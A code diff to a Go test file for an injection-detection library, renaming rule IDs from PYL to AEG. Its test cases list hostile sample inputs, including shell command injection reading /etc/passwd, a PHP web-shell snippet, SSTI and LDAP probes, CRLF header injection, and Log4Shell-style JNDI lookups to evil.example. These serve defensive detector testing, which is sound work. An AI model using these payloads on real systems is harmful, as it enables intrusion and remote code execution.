@@ -5,7 +5,7 @@ import (
 	"testing"
 	"time"
 
-	"github.com/ergasterion-dev/pylolith/internal/model"
+	"github.com/ergasterion-dev/aegolith/internal/model"
 )
 
 // injectionLegit is realistic customer input (delivery notes, product names,
@@ -57,7 +57,7 @@ func assertNoHits(t *testing.T, name string, fn func(string) (Hit, bool), vals [
 }
 
 func TestCmdIPositives(t *testing.T) {
-	want := Hit{RuleID: "PYL-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
+	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
 	assertHits(t, "CmdI", CmdI, want, []string{
 		"; id",
 		"| cat /etc/passwd",
@@ -163,7 +163,7 @@ func TestCmdINegatives(t *testing.T) {
 }
 
 func TestCodeIPositives(t *testing.T) {
-	want := Hit{RuleID: "PYL-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
+	want := Hit{RuleID: "AEG-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
 	assertHits(t, "CodeI", CodeI, want, []string{
 		"<?php system($_GET['c']); ?>",
 		"eval(base64_decode('cGhwaW5mbygpOw=='))",
@@ -176,7 +176,7 @@ func TestCodeIPositives(t *testing.T) {
 		`require("child_process").spawn("sh")`,
 		"%3C%3Fphp%20phpinfo()%3B",
 	})
-	ser := Hit{RuleID: "PYL-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
+	ser := Hit{RuleID: "AEG-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
 	assertHits(t, "CodeI", CodeI, ser, []string{
 		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
 		"aced00057372001",
@@ -202,7 +202,7 @@ func TestCodeINegatives(t *testing.T) {
 }
 
 func TestLDAPPositives(t *testing.T) {
-	want := Hit{RuleID: "PYL-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
+	want := Hit{RuleID: "AEG-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
 	assertHits(t, "LDAP", LDAP, want, []string{
 		"*)(uid=*))(|(uid=*",
 		// Beyond the brief.
@@ -226,7 +226,7 @@ func TestLDAPNegatives(t *testing.T) {
 }
 
 func TestSSTIPositives(t *testing.T) {
-	want := Hit{RuleID: "PYL-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
+	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
 	assertHits(t, "SSTI", SSTI, want, []string{
 		"{{config.items()}}",
 		"{{''.__class__.__mro__[1].__subclasses__()}}",
@@ -271,7 +271,7 @@ func TestSSTINegatives(t *testing.T) {
 }
 
 func TestJNDIPositives(t *testing.T) {
-	want := Hit{RuleID: "PYL-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
+	want := Hit{RuleID: "AEG-JNDI-001", Category: model.CatJNDI, Severity: model.SeverityCritical}
 	assertHits(t, "JNDI", JNDI, want, []string{
 		"${jndi:ldap://evil.example/a}",
 		"${${lower:j}ndi:${lower:l}dap://evil.example/a}",
@@ -298,7 +298,7 @@ func TestJNDINegatives(t *testing.T) {
 }
 
 func TestCRLFPositives(t *testing.T) {
-	want := Hit{RuleID: "PYL-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
+	want := Hit{RuleID: "AEG-CRLF-001", Category: model.CatCRLF, Severity: model.SeverityHigh}
 	assertHits(t, "CRLF", CRLF, want, []string{
 		"x%0d%0aSet-Cookie:%20admin=true",
 		"x\r\nSet-Cookie: admin=true",
